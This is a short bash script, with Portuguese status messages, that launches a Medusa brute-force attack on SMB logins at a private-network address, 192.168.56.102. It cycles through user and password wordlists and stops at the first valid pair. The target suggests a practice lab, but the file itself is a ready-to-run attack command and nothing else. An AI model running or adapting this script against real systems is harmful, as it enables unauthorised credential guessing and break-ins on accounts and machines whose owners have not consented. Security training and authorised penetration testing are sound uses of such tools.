#!/bin/bash

# Target
TARGET="192.168.56.102"

# Wordlists
USERS="../wordlists/users.txt"
PASSWORDS="../wordlists/passwords.txt"

echo "Iniciando ataque de força bruta contra SMB..."

medusa -h $TARGET \
-U $USERS \
-P $PASSWORDS \
-M smbnt \
-t 4 \
-v 4 \
-f

echo "Ataque finalizado."
